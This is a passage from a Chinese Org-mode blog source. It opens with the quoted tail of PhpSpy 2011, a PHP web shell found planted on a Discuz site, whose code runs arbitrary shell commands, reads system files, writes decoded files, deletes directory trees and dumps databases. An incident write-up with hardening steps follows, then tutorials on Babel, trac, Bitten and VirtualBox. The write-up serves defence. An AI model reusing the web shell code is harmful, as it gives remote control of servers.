               if(!$GLOBALS['safe_mode']) {
                   $temp=array();
                   foreach ($userful as $item)
                       if(which($item)){$temp[]=$item;}
                   secparam('Userful', implode(', ',$temp));
                   $temp=array();
                   foreach ($danger as $item)
                       if(which($item)){$temp[]=$item;}
                   secparam('Danger', implode(', ',$temp));
                   $temp=array();
                   foreach ($downloaders as $item) 
                       if(which($item)){$temp[]=$item;}
                   secparam('Downloaders', implode(', ',$temp));
                   secparam('Hosts', @file_get_contents('/etc/hosts'));
                   secparam('HDD space', execute('df -h'));
                   secparam('Mount options', @file_get_contents('/etc/fstab'));
               }
           } else {
               secparam('OS Version',execute('ver'));
               secparam('Account Settings',execute('net accounts'));
               secparam('User Accounts',execute('net user'));
               secparam('IP Configurate',execute('ipconfig -all'));
           }
       }//end
       
       else {
           m('Undefined Action');
       }
       
       ?>
       </td></tr></table>
       <div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
           <span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
           Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
       </div>
       </body>
       </html>
       
       <?php
       
       /*======================================================
       函数库
       ======================================================*/
       
       function secparam($n, $v) {
           $v = trim($v);
           if($v) {
               p('<h2>'.$n.' &raquo;</h2>');
               p('<div class="infolist">');
               if(strpos($v, "\n") === false)
                   p($v.'<br />');
               else
                   p('<pre>'.$v.'</pre>');
               p('</div>');
           }
       }
       function m($msg) {
           echo '<div style="margin:10px auto 15px auto;background:#ffffe0;border:1px solid #e6db55;padding:10px;font:14px;text-align:center;font-weight:bold;">';
           echo $msg;
           echo '</div>';
       }
       function scookie($key, $value, $life = 0, $prefix = 1) {
           global $timestamp, $_SERVER, $cookiepre, $cookiedomain, $cookiepath, $cookielife;
           $key = ($prefix ? $cookiepre : '').$key;
           $life = $life ? $life : $cookielife;
           $useport = $_SERVER['SERVER_PORT'] == 443 ? 1 : 0;
           setcookie($key, $value, $timestamp+$life, $cookiepath, $cookiedomain, $useport);
       }   
       function multi($num, $perpage, $curpage, $tablename) {
           $multipage = '';
           if($num > $perpage) {
               $page = 10;
               $offset = 5;
               $pages = @ceil($num / $perpage);
               if($page > $pages) {
                   $from = 1;
                   $to = $pages;
               } else {
                   $from = $curpage - $offset;
                   $to = $curpage + $page - $offset - 1;
                   if($from < 1) {
                       $to = $curpage + 1 - $from;
                       $from = 1;
                       if(($to - $from) < $page && ($to - $from) < $pages) {
                           $to = $page;
                       }
                   } elseif($to > $pages) {
                       $from = $curpage - $pages + $to;
                       $to = $pages;
                       if(($to - $from) < $page && ($to - $from) < $pages) {
                           $from = $pages - $page + 1;
                       }
                   }
               }
               $multipage = ($curpage - $offset > 1 && $pages > $page ? '<a href="javascript:settable(\''.$tablename.'\', \'\', 1);">First</a> ' : '').($curpage > 1 ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage - 1).');">Prev</a> ' : '');
               for($i = $from; $i <= $to; $i++) {
                   $multipage .= $i == $curpage ? $i.' ' : '<a href="javascript:settable(\''.$tablename.'\', \'\', '.$i.');">['.$i.']</a> ';
               }
               $multipage .= ($curpage < $pages ? '<a href="javascript:settable(\''.$tablename.'\', \'\', '.($curpage + 1).');">Next</a>' : '').($to < $pages ? ' <a href="javascript:settable(\''.$tablename.'\', \'\', '.$pages.');">Last</a>' : '');
               $multipage = $multipage ? '<p>Pages: '.$multipage.'</p>' : '';
           }
           return $multipage;
       }
       // 登陆入口
       function loginpage() {
       ?>
           <style type="text/css">
           input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
           </style>
           <form method="POST" action="">
           <span style="font:11px Verdana;">Password: </span><input name="password" type="password" size="20">
           <input type="hidden" name="action" value="login">
           <input type="submit" value="Login">
           </form>
       <?php
           exit;
       }//end loginpage()
       
       function execute($cfe) {
           $res = '';
           if ($cfe) {
               if(function_exists('system')) {
                   @ob_start();
                   @system($cfe);
                   $res = @ob_get_contents();
                   @ob_end_clean();
               } elseif(function_exists('passthru')) {
                   @ob_start();
                   @passthru($cfe);
                   $res = @ob_get_contents();
                   @ob_end_clean();
               } elseif(function_exists('shell_exec')) {
                   $res = @shell_exec($cfe);
               } elseif(function_exists('exec')) {
                   @exec($cfe,$res);
                   $res = join("\n",$res);
               } elseif(@is_resource($f = @popen($cfe,"r"))) {
                   $res = '';
                   while(!@feof($f)) {
                       $res .= @fread($f,1024); 
                   }
                   @pclose($f);
               }
           }
           return $res;
       }
       function which($pr) {
           $path = execute("which $pr");
           return ($path ? $path : $pr); 
       }
       
       function cf($fname,$text){
           if($fp=@fopen($fname,'w')) {
               @fputs($fp,@base64_decode($text));
               @fclose($fp);
           }
       }
       function dirsize($dir) { 
           $dh = @opendir($dir);
           $size = 0;
           while($file = @readdir($dh)) {
               if ($file != '.' && $file != '..') {
                   $path = $dir.'/'.$file;
                   $size += @is_dir($path) ? dirsize($path) : @filesize($path);
               }
           }
           @closedir($dh);
           return $size;
       }
       // 页面调试信息
       function debuginfo() {
           global $starttime;
           $mtime = explode(' ', microtime());
           $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
           echo 'Processed in '.$totaltime.' second(s)';
       }
       
       //连接MYSQL数据库
       function mydbconn($dbhost,$dbuser,$dbpass,$dbname='',$charset='',$dbport='3306') {
           global $charsetdb;
           @ini_set('mysql.connect_timeout', 5);
           if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
               p('<h2>Can not connect to MySQL server</h2>');
               exit;
           }
           if($link && $dbname) {
               if (!@mysql_select_db($dbname, $link)) {
                   p('<h2>Database selected has error</h2>');
                   exit;
               }
           }
           if($link && mysql_get_server_info() > '4.1') {
               if($charset && in_array(strtolower($charset), $charsetdb)) {
                   q("SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;", $link);
               }
           }
           return $link;
       }
       
       // 去掉转义字符
       function s_array(&$array) {
           if (is_array($array)) {
               foreach ($array as $k => $v) {
                   $array[$k] = s_array($v);
               }
           } else if (is_string($array)) {
               $array = stripslashes($array);
           }
           return $array;
       }
       
       // 清除HTML代码
       function html_clean($content) {
           $content = htmlspecialchars($content);
           $content = str_replace("\n", "<br />", $content);
           $content = str_replace("  ", "&nbsp;&nbsp;", $content);
           $content = str_replace("\t", "&nbsp;&nbsp;&nbsp;&nbsp;", $content);
           return $content;
       }
       
       // 获取权限
       function getChmod($filepath){
           return substr(base_convert(@fileperms($filepath),10,8),-4);
       }
       
       function getPerms($filepath) {
           $mode = @fileperms($filepath);
           if (($mode & 0xC000) === 0xC000) {$type = 's';}
           elseif (($mode & 0x4000) === 0x4000) {$type = 'd';}
           elseif (($mode & 0xA000) === 0xA000) {$type = 'l';}
           elseif (($mode & 0x8000) === 0x8000) {$type = '-';} 
           elseif (($mode & 0x6000) === 0x6000) {$type = 'b';}
           elseif (($mode & 0x2000) === 0x2000) {$type = 'c';}
           elseif (($mode & 0x1000) === 0x1000) {$type = 'p';}
           else {$type = '?';}
       
           $owner['read'] = ($mode & 00400) ? 'r' : '-'; 
           $owner['write'] = ($mode & 00200) ? 'w' : '-'; 
           $owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
           $group['read'] = ($mode & 00040) ? 'r' : '-'; 
           $group['write'] = ($mode & 00020) ? 'w' : '-'; 
           $group['execute'] = ($mode & 00010) ? 'x' : '-'; 
           $world['read'] = ($mode & 00004) ? 'r' : '-'; 
           $world['write'] = ($mode & 00002) ? 'w' : '-'; 
           $world['execute'] = ($mode & 00001) ? 'x' : '-'; 
       
           if( $mode & 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S';}
           if( $mode & 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S';}
           if( $mode & 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T';}
        
           return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
       }
       
       function getUser($filepath)     {
           if (function_exists('posix_getpwuid')) {
               $array = @posix_getpwuid(@fileowner($filepath));
               if ($array && is_array($array)) {
                   return ' / <a href="#" title="User: '.$array['name'].'&#13&#10Passwd: '.$array['passwd'].'&#13&#10Uid: '.$array['uid'].'&#13&#10gid: '.$array['gid'].'&#13&#10Gecos: '.$array['gecos'].'&#13&#10Dir: '.$array['dir'].'&#13&#10Shell: '.$array['shell'].'">'.$array['name'].'</a>';
               }
           }
           return '';
       }
       
       // 删除目录
       function deltree($deldir) {
           $mydir=@dir($deldir);   
           while($file=$mydir->read())     {       
               if((is_dir($deldir.'/'.$file)) && ($file!='.') && ($file!='..')) { 
                   @chmod($deldir.'/'.$file,0777);
                   deltree($deldir.'/'.$file); 
               }
               if (is_file($deldir.'/'.$file)) {
                   @chmod($deldir.'/'.$file,0777);
                   @unlink($deldir.'/'.$file);
               }
           } 
           $mydir->close(); 
           @chmod($deldir,0777);
           return @rmdir($deldir) ? 1 : 0;
       }
       
       // 表格行间的背景色替换
       function bg() {
           global $bgc;
           return ($bgc++%2==0) ? 'alt1' : 'alt2';
       }
       
       // 获取当前的文件系统路径
       function getPath($scriptpath, $nowpath) {
           if ($nowpath == '.') {
               $nowpath = $scriptpath;
           }
           $nowpath = str_replace('\\', '/', $nowpath);
           $nowpath = str_replace('//', '/', $nowpath);
           if (substr($nowpath, -1) != '/') {
               $nowpath = $nowpath.'/';
           }
           return $nowpath;
       }
       
       // 获取当前目录的上级目录
       function getUpPath($nowpath) {
           $pathdb = explode('/', $nowpath);
           $num = count($pathdb);
           if ($num > 2) {
               unset($pathdb[$num-1],$pathdb[$num-2]);
           }
           $uppath = implode('/', $pathdb).'/';
           $uppath = str_replace('//', '/', $uppath);
           return $uppath;
       }
       
       // 检查PHP配置参数
       function getcfg($varname) {
           $result = get_cfg_var($varname);
           if ($result == 0) {
               return 'No';
           } elseif ($result == 1) {
               return 'Yes';
           } else {
               return $result;
           }
       }
       
       // 检查函数情况
       function getfun($funName) {
           return (false !== function_exists($funName)) ? 'Yes' : 'No';
       }
       
       // 获得文件扩展名
       function getext($file) {
           $info = pathinfo($file);
           return $info['extension'];
       }
       
       function GetWDirList($dir){
           global $dirdata,$j,$nowpath;
           !$j && $j=1;
           if ($dh = opendir($dir)) {
               while ($file = readdir($dh)) {
                   $f=str_replace('//','/',$dir.'/'.$file);
                   if($file!='.' && $file!='..' && is_dir($f)){
                       if (is_writable($f)) {
                           $dirdata[$j]['filename']=str_replace($nowpath,'',$f);
                           $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                           $dirdata[$j]['dirchmod']=getChmod($f);
                           $dirdata[$j]['dirperm']=getPerms($f);
                           $dirdata[$j]['dirlink']=$dir;
                           $dirdata[$j]['server_link']=$f;
                           $j++;
                       }
                       GetWDirList($f);
                   }
               }
               closedir($dh);
               clearstatcache();
               return $dirdata;
           } else {
               return array();
           }
       }
       
       function GetWFileList($dir){
           global $filedata,$j,$nowpath, $writabledb;
           !$j && $j=1;
           if ($dh = opendir($dir)) {
               while ($file = readdir($dh)) {
                   $ext = getext($file);
                   $f=str_replace('//','/',$dir.'/'.$file);
                   if($file!='.' && $file!='..' && is_dir($f)){
                       GetWFileList($f);
                   } elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                       if (is_writable($f)) {
                           $filedata[$j]['filename']=str_replace($nowpath,'',$f);
                           $filedata[$j]['size']=sizecount(@filesize($f));
                           $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                           $filedata[$j]['filechmod']=getChmod($f);
                           $filedata[$j]['fileperm']=getPerms($f);
                           $filedata[$j]['fileowner']=getUser($f);
                           $filedata[$j]['dirlink']=$dir;
                           $filedata[$j]['server_link']=$f;
                           $j++;
                       }
                   }
               }
               closedir($dh);
               clearstatcache();
               return $filedata;
           } else {
               return array();
           }
       }
       
       function GetSFileList($dir, $content, $re = 0) {
           global $filedata,$j,$nowpath, $writabledb;
           !$j && $j=1;
           if ($dh = opendir($dir)) {
               while ($file = readdir($dh)) {
                   $ext = getext($file);
                   $f=str_replace('//','/',$dir.'/'.$file);
                   if($file!='.' && $file!='..' && is_dir($f)){
                       GetSFileList($f, $content, $re = 0);
                   } elseif($file!='.' && $file!='..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                       $find = 0;
                       if ($re) {
                           if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$content.'@', @file_get_contents($f)) ){
                               $find = 1;
                           }
                       } else {
                           if ( strstr($file, $content) || strstr( @file_get_contents($f),$content ) ) {
                               $find = 1;
                           }
                       }
                       if ($find) {
                           $filedata[$j]['filename']=str_replace($nowpath,'',$f);
                           $filedata[$j]['size']=sizecount(@filesize($f));
                           $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));
                           $filedata[$j]['filechmod']=getChmod($f);
                           $filedata[$j]['fileperm']=getPerms($f);
                           $filedata[$j]['fileowner']=getUser($f);
                           $filedata[$j]['dirlink']=$dir;
                           $filedata[$j]['server_link']=$f;
                           $j++;
                       }
                   }
               }
               closedir($dh);
               clearstatcache();
               return $filedata;
           } else {
               return array();
           }
       }
       
       function qy($sql) { 
           global $mysqllink;
           //echo $sql.'<br>';
           $res = $error = '';
           if(!$res = @mysql_query($sql,$mysqllink)) { 
               return 0;
           } else if(is_resource($res)) {
               return 1; 
           } else {
               return 2;
           }   
           return 0;
       }
       
       function q($sql) { 
           global $mysqllink;
           return @mysql_query($sql,$mysqllink);
       }
       
       function fr($qy){
           mysql_free_result($qy);
       }
       
       function sizecount($fileSize) {
           $size = sprintf("%u", $fileSize);
           if($size == 0) {
               return '0 Bytes' ;
           }
           $sizename = array(' Bytes', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
           return round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
       }
       // 备份数据库
       function sqldumptable($table, $fp=0) {
           global $mysqllink;
       
           $tabledump = "DROP TABLE IF EXISTS `$table`;\n";
           $res = q("SHOW CREATE TABLE $table");
           $create = mysql_fetch_row($res);
           $tabledump .= $create[1].";\n\n";
       
           if ($fp) {
               fwrite($fp,$tabledump);
           } else {
               echo $tabledump;
           }
           $tabledump = '';
           $rows = q("SELECT * FROM $table");
           while ($row = mysql_fetch_assoc($rows)) {
               foreach($row as $k=>$v) {
                   $row[$k] = "'".@mysql_real_escape_string($v)."'";
               }
               $tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(", ", $row).');'."\n";
               if ($fp) {
                   fwrite($fp,$tabledump);
               } else {
                   echo $tabledump;
               }
           }
           fwrite($fp,"\n\n");
           fr($rows);
       }
       
       function p($str){
           echo $str."\n";
       }
       
       function tbhead() {
           p('<table width="100%" border="0" cellpadding="4" cellspacing="0">');
       }
       function tbfoot(){
           p('</table>');
       }
       
       function makehide($name,$value=''){
           p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
       }
       
       function makeinput($arg = array()){
           $arg['size'] = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
           $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
           !$arg['type'] && $arg['type'] = 'text';
           $arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
           $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
           if ($arg['newline']) {
               p("<p>$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
           } else {
               p("$arg[title]<input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
           }
       }
       
       function makeselect($arg = array()){
           if ($arg['onchange']) {
               $onchange = 'onchange="'.$arg['onchange'].'"';
           }
           $arg['title'] = $arg['title'] ? $arg['title'] : '';
           if ($arg['newline']) p('<p>');
           p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
               if (is_array($arg['option'])) {
                   if ($arg['nokey']) {
                       foreach ($arg['option'] as $value) {
                           if ($arg['selected']==$value) {
                               p("<option value=\"$value\" selected>$value</option>");
                           } else {
                               p("<option value=\"$value\">$value</option>");
                           }
                       }
                   } else {
                       foreach ($arg['option'] as $key=>$value) {
                           if ($arg['selected']==$key) {
                               p("<option value=\"$key\" selected>$value</option>");
                           } else {
                               p("<option value=\"$key\">$value</option>");
                           }
                       }
                   }
               }
           p("</select>");
           if ($arg['newline']) p('</p>');
       }
       function formhead($arg = array()) {
           global $self;
           !$arg['method'] && $arg['method'] = 'post';
           !$arg['action'] && $arg['action'] = $self;
           $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
           !$arg['name'] && $arg['name'] = 'form1';
           p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" method=\"$arg[method]\" $arg[target]>");
           if ($arg['title']) {
               p('<h2>'.$arg['title'].' &raquo;</h2>');
           }
       }
           
       function maketext($arg = array()){
           !$arg['cols'] && $arg['cols'] = 100;
           !$arg['rows'] && $arg['rows'] = 25;
           $arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';
           p("<p>$arg[title]<textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>$arg[value]</textarea></p>");
       }
       
       function formfooter($name = ''){
           !$name && $name = 'submit';
           p('<p><input class="bt" name="'.$name.'" id="'.$name.'" type="submit" value="Submit"></p>');
           p('</form>');
       }
       
       function goback(){
           global $self, $nowpath;
           p('<form action="'.$self.'" method="post"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="'.$nowpath.'" /><p><input class="bt" type="submit" value="Go back..."></p></form>');
       }
       
       function formfoot(){
           p('</form>');
       }
       
       function encode_pass($pass) {
           $pass = md5('angel'.$pass);
           $pass = md5($pass.'angel');
           $pass = md5('angel'.$pass.'angel');
           return $pass;
       }
       
       function pr($s){
           echo "<pre>".print_r($s).'</pre>';
       }
       
       ?>
     #+end_src

     上面的脚本被恶意用户完成对系统的远程控制。

** 问题根源
   
   这次发现的恶意代码注入应该是之前的一次 =nginx= 和 =php= [[http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443][安全漏洞]] 引起，当时由 =WooYun.org= 汇报，原来已经被恶意用户种下了这些后门。

   这个漏洞简言之就是用户可以上传文件后缀为 =.php.jpg= 的文件，在外部访问时直接被当做 =php= 执行，罪魁祸首归结为以下三点：

   - =php= 配置
     
   - =nginx= 配置
     
   - =discuz=

     允许上传文件名指定后缀为 =.php.jpg=

** 加固措施
   
   - 采用更严格的文件目录权限

     + 列出属主不应该为 =nobody= 的目录：

       #+begin_src sh
         find . -type d  | xargs ls -lad | grep nobody | grep -v '/data'
       #+end_src
     
       除 =discuz= 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 =nobody= 用户。
       
       需要注意的是 =source/plugin/= 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：

       #+begin_example
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
       #+end_example

     + 列出属主不应该为 =nobody= 的文件：

       #+begin_src sh
         find . -type f  | xargs ls -la | grep nobody | grep -v '/data'
       #+end_src

       除 =discuz= 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 =nobody= 用户。

     + 列出 =nobody= 可写的文件
       
       #+begin_src sh
         find . -type f ! -perm 0644  | xargs ls -la | grep -v '/data/'
       #+end_src
       
       收回非必要的写权限。

   - 确保上传目录中的 =php= 文件不会被当做 =php= 执行

     + data/attachment
     + uc_server/data/avatar
     + uc_server/data/tmp

* DONE python应用国际化：Babel                                 :python:babel:
  CLOSED: [2014-03-09 Sun 19:54]
  :PROPERTIES:
  :PAGE:     index.html
  :TEMPLATE: blog_static_no_title.html
  :END:

  [[http://babel.pocoo.org/][Babel]] 是 =Python= 的一个国际化工具包，原本为[[Edgewall.org]]下的一个项目，现在已经转为由[[pocoo.org]]维护。
  
** 统一管理 =Python= 虚拟环境
   
   #+begin_src sh
     yaourt -S python-virtualenvwrapper
     mkdir $HOME/.virtualenvs
     echo 'export WORKON_HOME=$HOME/.virtualenvs' >> ~/.bashrc
     echo 'source virtualenvwrapper.sh' >> ~/.bashrc
     source ~/.bashrc
   #+end_src

** 建立学习 =Babel= 专用虚拟环境

   #+begin_src sh
     mkvirtualenv --python=/usr/bin/python2 --no-site-packages LearnBabel
   #+end_src

** 编译安装 =Babel=

   #+begin_src sh
     git clone https://github.com/mitsuhiko/babel.git
     cd babel
     pip install pytz
     python setup.py import_cldr
     pip install --editable .
   #+end_src
  
** 常用信息国际化

   #+begin_example
     >>> from babel import Locale
     >>> locale = Locale('en', 'US')
     >>> print locale.territories['CN']
     China
     >>> locale = Locale('zh')
     >>> print locale.territories['CN']
     中国
     >>> month_names = locale.months['format']['wide'].items()
     >>> for idx, name in sorted(month_names):
     ...   print name
     ... 
     一月
     二月
     三月
     四月
     五月
     六月
     七月
     八月
     九月
     十月
     十一月
     十二月
     >>> from datetime import date
     >>> from babel.dates import format_date
     >>> today = date.today()
     >>> print format_date(today, locale='zh')
     2014年3月9日
   #+end_example

** 任意信息国际化

   - 创建python程序： =hello.py=

     #+begin_src python
       import gettext
       gettext.bindtextdomain('messages', './hello.i18n')
       _ = gettext.gettext
       print _('Hello')
     #+end_src

   - 创建Babel配置文件： =hello.babel=

     #+begin_example
       [python: hello.py]
     #+end_example

   - 准备翻译成中文

     #+begin_src sh
       mkdir hello.i18n
       pybabel extract -F hello.babel . -o hello.i18n/messages.pot    # 从源代码中提取可翻译的文本到POT（PO模板）文件
       pybabel init -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    # 将POT文本拷贝出一份指定语言的PO文件
     #+end_src

   - 译成中文后的PO文件： =./hello.i18n/zh_CN/LC_MESSAGES/messages.po=

     #+begin_example
       # Chinese (Simplified, China) translations for PROJECT.
       # Copyright (C) 2014 ORGANIZATION
       # This file is distributed under the same license as the PROJECT project.
       # FIRST AUTHOR <EMAIL@ADDRESS>, 2014.
       #
       #, fuzzy
       msgid ""
       msgstr ""
       "Project-Id-Version: PROJECT VERSION\n"
       "Report-Msgid-Bugs-To: EMAIL@ADDRESS\n"
       "POT-Creation-Date: 2014-03-09 19:08+0800\n"
       "PO-Revision-Date: 2014-03-09 19:12+0800\n"
       "Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
       "Language-Team: zh_Hans_CN <LL@li.org>\n"
       "Plural-Forms: nplurals=2; plural=(n != 1)\n"
       "MIME-Version: 1.0\n"
       "Content-Type: text/plain; charset=utf-8\n"
       "Content-Transfer-Encoding: 8bit\n"
       "Generated-By: Babel 2.0-dev\n"
       
       #: hello.py:1
       msgid "Hello"
       msgstr "喂"
       
     #+end_example

   - 编译翻译结果

     #+begin_src sh
       pybabel compile -f -d ./hello.i18n    #编译PO文件为MO文件
     #+end_src
   
   - 英文环境下运行程序

     #+begin_example
       python ./hello.py
       Hello
     #+end_example

   - 中文环境下运行程序
     
     #+begin_example
       LC_ALL=zh_CN python ./hello.py
       喂
     #+end_example

   - 更新 =hello.py= ，追加一句“      print _('World')”

   - 将“World”翻译成中文

     #+begin_src sh
       pybabel extract -F hello.babel . -o hello.i18n/messages.pot    # 从源代码中提取可翻译的文本到POT（PO模板）文件
       pybabel update -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    # 从POT文本更新指定语言的PO文件
       # 开始翻译指定语言的PO文件： hello.i18n/zh_CN/LC_MESSAGES/messages.po
       pybabel compile -f -d ./hello.i18n    #编译PO文件为MO文件
     #+end_src

   - 再次运行

     #+begin_example
       LC_ALL=zh_CN python ./hello.py
       喂
       世界
     #+end_example    

   - 程序中强制使用中文语言： =hello.cn.py=
     
     #+begin_src python
       import gettext
       
       t = gettext.translation('messages', './hello.i18n', languages=['zh_CN'])
       _ = t.gettext
       
       print _('Hello')
       print _('World')
     #+end_src
    
   - 即使是在英文环境下也输出中文

     #+begin_example
       LC_ALL=en_US python ./hello.py
       喂
       世界
     #+end_example

* DONE 开源项目管理系统：trac                                   :python:trac:
  CLOSED: [2014-03-10 Mon 00:44]

  最近负责为公司搭建项目管理系统，有如下要求：
  - 支持BUG管理

  - 支持帐号管理

  - 支持WIKI

  - 支持任务分配

  - 支持中文

  由于时间紧迫，感觉 =redmine= 界面更漂亮，相关资料也好找，而且帐号管理、中文支持方面的很不错，所以选择了 =redmine= 。其实心里面一直希望选的是基于 =python= 开发的系统，一方面自已喜欢 =python= ，另外团队中对 =python= 熟悉的人比较多，这样后面需要做二次开发时会容易一些。

  =trac= 给人的第一感觉是太过于简单粗糙了。界面朴实简洁尚可接受、演示站点中文化不彻底、自已安装的时候较之 =redmine= 更是磕磕绊绊。=trac= 使用 =Babel= 进行多语言支持，当前的trac稳定版（1.0）存在中文支持方面的Bug：[[http://trac.edgewall.org/ticket/10903][Wrong `NullTranslations` class in functional tests]] ，我在安装过程中就遇到了，正是这个问题才觉得先研究一下 =Babel= ，于是有了上一篇文章 《[[http://blog.kankanan.com/posts/2014/03/09_python5e94752856fd96455316ff1ababel.html][python应用国际化：Babel]]》， =trac= 下一版（1.1）对这个问题进行了修复。 网络上有很多人对 =trac= 夸赞有加，另外 =trac= 还有持续集成的插件： [[http://bitten.edgewall.org/][Bitten]] ， 在对 =Babel= 有一定了解后，我终于鼓气勇气研究起 [[http://trac.edgewall.org/][trac]] 。

** 安装最新版 =trac=

   - 使用学习 =Babel= 时建的虚拟环境
     
     #+begin_src sh
       workon LearnBabel
     #+end_src

   - 从最新源代码安装 =trac=
     
     #+begin_src sh
       svn checkout http://svn.edgewall.org/repos/trac/trunk trac
       cd trac
       python ./setup.py install
     #+end_src
  
   - 建一个项目看看效果
     
     #+begin_src sh
       cd ~/Examples/python
       trac-admin LearnTrac initenv
       tracd --port 8080 LearnTrac &
       xdg-open http://localhost:8080
     #+end_src

   感觉 =trac= 的中文化做得还不够彻底，但是关键的部位都已经中文化，不影响对整个系统的使用，有了 =Babel= 的经验之后对它进行中文化是很容易的，翻译后提交给 =trac= 开发人员，也算是回馈开源社区了。

** 配置用户

   - 创建帐号文件 =LearnTrac/conf/users.digest=

     #+begin_src sh
       user=admin
       realm=localhost
       password=admin
       file=LearnTrac/conf/users.digest
       echo ${user}:${realm}:$(printf "${user}:${realm}:${password}" | md5sum - | sed -e 's/\s\+-//') >> ${file}
     #+end_src

   - 重新启动服务

     #+begin_src python
       tracd -p 8080 --auth="LearnTrac,LearnTrac/conf/users.digest,localhost" LearnTrac
     #+end_src

   现在可以使用 =admin= 帐号登录了

   帐号管理方面 =trac= 比较弱，只能通过 =trac-admin= 命令行工具来管理，小团队使用还是可以接受的，另外仅支持HTTP认证，配上HTTPS布署到外网也算是不错的选择。

** 配置权限

   - 为 =admin= 用户赋予管理员权限

     #+begin_src python
       trac-admin LearnTrac permission add admin TRAC_ADMIN
     #+end_src

   现在可以在WEB界面上看到“管理”标签页了，可以在WEB界面上对权限进行配置。

* TODO 开源持续集成系统：Bitten                               :python:bitten:

   - 使用学习 =Babel= 时建的虚拟环境
     
     #+begin_src sh
       workon LearnBabel
     #+end_src

   - 从最新源代码安装 =Bitten=
     
     #+begin_src sh
       svn co http://svn.edgewall.org/repos/bitten/trunk bitten
       cd bitten
       python ./setup.py install
     #+end_src

   - 在 =Trac= 中启用 =Bitten=

     修改 =LearnTrac/conf/trac.ini= 中 =[components]= 下，添加：

     #+begin_src conf
       bitten.* = enabled
     #+end_src

   - 插件更新生效

     #+begin_src sh
       trac-admin LearnTrac upgrade
     #+end_src

   - 配置用户权限

     #+begin_src sh
       trac-admin LearnTrac permission add admin BUILD_ADMIN
       trac-admin LearnTrac permission add anonymous BUILD_VIEW
     #+end_src

   - 现在打开Web界面就可以看到“Build Status”标签页了
* TODO Web系统安全要点                                         :web:security:

  恶意用户注入代码到系统是很难避免的，正所谓百密一疏，关键是要限制注入的代码产生的影响。

  - 防止泄露用户敏感信息
    
    不保存用户的敏感信息，可采用第三方帐号系统。

  - 防止恶意用户取得 =root= 权限

    以 =nobody= 帐号运行服务。

  - 防止代码被侵入者篡改

    所有代码及相关资源属主不得为 =nobody= ，禁止 =nobody= 用户访问。

  - 防止执行用户上传的内容

    只允许脚本产生的文件及所在目录属主为 =nobody= ，且不会被执行。

    可以通过仔细配置Web服务器，确保用户上传目录中的文件不被当做脚本执行。

  - 防止威胁到其它服务
    
    限制服务器对外访问。

  - 主动监控
    
    监控执行 =www= 目录之外的脚本的行为；监控调用 =eval= 等危险函数的行为。

  - 及时升级系统
  
    主动从内部或外部进行漏洞扫描，以便及时发现系统软件漏洞并进行升级。
* TODO VirtualBox虚拟机增加磁盘空间                        :virtualbox:linux:

  以下步骤为关闭虚拟机后进行，需要增加新空间挂载到 =/home= 。

  - 首先增加磁盘文件空间

    #+begin_src sh
      VBoxManage modifyhd ~/VirtualBox\ VMs/Ubuntu\ 12.04/Ubuntu\ 12.04.vdi --resize 40000
    #+end_src

    上面的例子中增加磁盘大小到40G.

 - 下载Gparted Live CD
   
   #+begin_src sh
     wget http://softlayer-ams.dl.sourceforge.net/project/gparted/gparted-live-stable/0.18.0-1/gparted-live-0.18.0-1-i486.iso
   #+end_src
   
   参考：https://wiki.archlinux.org/index.php/Gparted-Live#Bootable_CD

 - 挂载Gparted Live CD ISO文件启动虚拟机
